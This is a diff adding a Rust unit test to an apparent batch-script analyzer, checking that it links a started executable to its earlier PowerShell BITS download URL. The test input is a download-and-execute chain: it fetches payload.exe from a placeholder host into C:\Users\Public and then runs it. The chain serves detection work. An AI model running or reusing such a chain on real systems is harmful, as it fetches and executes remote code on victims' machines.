@@ -3403,6 +3403,27 @@ start "" "C:\Users\Public\payload.exe""#,
     }
 
     #[test]
+    fn start_local_target_resolves_prior_powershell_bits_destination_source_url() {
+        let report = analyze(
+            br#"powershell -Command "Start-BitsTransfer -Source 'https://start-ps-bits.example/payload.exe' -Destination 'C:\Users\Public\payload.exe'"
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://start-ps-bits.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior PowerShell BITS download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
